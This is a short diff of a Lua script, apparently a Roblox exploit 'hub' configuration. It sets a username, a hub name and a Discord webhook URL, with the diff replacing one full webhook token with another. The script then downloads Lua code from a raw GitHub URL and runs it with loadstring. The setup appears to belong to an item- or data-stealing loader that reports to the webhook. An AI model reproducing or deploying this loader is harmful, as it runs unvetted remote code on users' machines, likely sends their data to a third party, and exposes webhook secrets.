@@ -1,5 +1,5 @@
 _G.Username = "ratatox1" 
 _G.HubName = "DARK-SHADOW"
-_G.WebhookUrl = "https://discord.com/api/webhooks/1095525892400361592/uVcq1r8VziKFv247PB3i1M4gic7zXfDvPlN2dDGn4freFckNwT8ZoFGloaYRb_QLa9qH"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1095837830175010878/9z1KC_ZRAbLjSHV__-xgqzcyyyAEhJlVGMvoDmYn4Vgylrc9own162zIML8HvHHL9F0z"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
